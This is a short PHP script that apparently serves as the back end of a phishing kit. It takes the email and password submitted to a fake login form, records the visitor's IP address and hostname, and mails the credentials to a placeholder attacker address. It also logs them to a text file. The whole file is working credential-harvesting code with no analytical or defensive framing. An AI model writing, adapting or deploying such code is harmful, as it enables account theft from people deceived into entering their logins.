<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "Email=>".$_POST['email']."\n";
$message .= "Password=>".$_POST['password']."\n";
$message .= "IP=>".$ip."\n\n";
$send = "youremail@gmail.com";
$subject = "txts | $ip";

mail("$send", "$subject", $message);   

$fp = fopen("mainsecure.txt", "a");
fputs($fp, $message);
fclose($fp);
$praga = rand();
$praga = md5($praga);

?>
